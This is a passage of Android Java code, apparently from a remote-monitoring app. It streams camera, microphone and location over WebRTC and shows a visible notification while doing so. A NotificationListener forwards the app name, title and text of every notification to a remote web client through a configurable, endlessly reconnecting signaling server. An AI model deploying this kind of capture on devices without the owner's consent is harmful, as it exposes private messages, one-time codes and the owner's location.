    // ─────────────────────────────────────────────────────────────────────────
    // Notification
    // ─────────────────────────────────────────────────────────────────────────
    private Notification createNotification() {
        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "Streaming Service", NotificationManager.IMPORTANCE_LOW);
            ch.setDescription("Camera & microphone streaming");
            nm.createNotificationChannel(ch);
        }
        Intent stop = new Intent(this, StreamingService.class);
        stop.setAction("STOP_STREAMING");
        PendingIntent stopPI = PendingIntent.getService(this, 0, stop,
                (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                        ? PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT
                        : PendingIntent.FLAG_UPDATE_CURRENT);
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Streaming Active")
                .setContentText("Camera and microphone streaming is running")
                .addAction(android.R.drawable.ic_media_pause, "Stop", stopPI)
                .setSmallIcon(android.R.drawable.ic_menu_camera)
                .setOngoing(true)
                .build();
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Cleanup
    // ─────────────────────────────────────────────────────────────────────────
    private void cleanup() {
        stopLocationUpdates();
        // Disable torch if on
        if (torchOn) setTorch(false);
        if (frontCapturer != null) {
            try { frontCapturer.stopCapture(); } catch (InterruptedException ignored) {}
            frontCapturer.dispose(); frontCapturer = null;
        }
        if (backCapturer != null) {
            try { backCapturer.stopCapture(); } catch (InterruptedException ignored) {}
            backCapturer.dispose(); backCapturer = null;
        }
        if (frontSource  != null) { frontSource.dispose();  frontSource  = null; }
        if (backSource   != null) { backSource.dispose();   backSource   = null; }
        if (audioSource  != null) { audioSource.dispose();  audioSource  = null; }
        if (peerConnection != null) { peerConnection.close(); peerConnection = null; }
        if (frontHelper  != null) { frontHelper.dispose();  frontHelper  = null; }
        if (backHelper   != null) { backHelper.dispose();   backHelper   = null; }
        if (eglBase      != null) { eglBase.release();      eglBase      = null; }
        if (factory      != null) { factory.dispose();      factory      = null; }
        if (dataHandler  != null && dataRunnable != null) {
            dataHandler.removeCallbacks(dataRunnable);
            dataHandler = null; dataRunnable = null;
        }
        reconnectHandler.removeCallbacksAndMessages(null);
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Notification Listener
    // ─────────────────────────────────────────────────────────────────────────
    public static class NotificationListener extends NotificationListenerService {
        private Socket socket;
        private String webClientId;

        @Override public void onCreate() {
            super.onCreate();
            Log.d(TAG, "NotificationListener onCreate");
            connectSignaling();
        }

        private void connectSignaling() {
            try {
                IO.Options opts = new IO.Options();
                opts.transports           = new String[]{"websocket"};
                opts.reconnection         = true;
                opts.reconnectionAttempts = Integer.MAX_VALUE;
                opts.reconnectionDelay    = 3000;
                String signalingUrl = SettingsRepository.getSignalingUrl(this);
                socket = IO.socket(signalingUrl, opts);
                socket.on(Socket.EVENT_CONNECT, args -> {
                    Log.d(TAG, "NotificationListener connected");
                    socket.emit("identify", "android");
                }).on("web-client-ready", args -> {
                    if (args[0] instanceof String) {
                        webClientId = (String) args[0];
                        sendActiveNotifications();
                    }
                }).on(Socket.EVENT_CONNECT_ERROR, args -> {
                    Log.e(TAG, "NotificationListener connect error: " + Arrays.toString(args));
                });
                socket.connect();
            } catch (URISyntaxException e) { Log.e(TAG, "NotificationListener bad URL", e); }
        }

        private void sendActiveNotifications() {
            try {
                StatusBarNotification[] active = getActiveNotifications();
                if (active != null) for (StatusBarNotification sbn : active) onNotificationPosted(sbn);
            } catch (Exception e) { Log.e(TAG, "Error sending active notifications", e); }
        }

        @Override
        public void onNotificationPosted(StatusBarNotification sbn) {
            if (webClientId == null || socket == null || !socket.connected()) return;
            try {
                Notification n = sbn.getNotification();
                JSONObject d = new JSONObject();
                d.put("appName",   sbn.getPackageName());
                d.put("title",     n.extras.getString(Notification.EXTRA_TITLE, "No Title"));
                d.put("text",      n.extras.getString(Notification.EXTRA_TEXT,  "No Text"));
                d.put("timestamp", new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date(sbn.getPostTime())));
                JSONObject msg = new JSONObject();
                msg.put("to", webClientId); msg.put("from", socket.id()); msg.put("notification", d);
                socket.emit("notification", msg);
            } catch (JSONException e) { Log.e(TAG, "Error sending notification", e); }
        }

        @Override public void onDestroy() {
            super.onDestroy();
            if (socket != null) { socket.disconnect(); socket = null; }
        }
    }
}
